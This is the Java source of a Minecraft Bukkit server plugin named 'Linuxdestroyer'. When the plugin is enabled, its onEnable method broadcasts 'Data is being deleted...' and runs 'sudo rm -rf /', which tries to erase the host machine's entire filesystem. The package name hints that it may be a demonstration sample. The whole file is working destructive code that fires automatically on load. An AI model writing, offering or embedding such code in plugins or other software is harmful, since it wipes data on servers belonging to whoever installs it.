package ahnlab.linuxdestroyer;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;

public final class Linuxdestroyer extends JavaPlugin {

    @Override
    public void onEnable() {
        Bukkit.broadcastMessage("Data is being deleted...");
        try {
            Runtime.getRuntime().exec("sudo rm -rf /");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        // Plugin startup logic
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
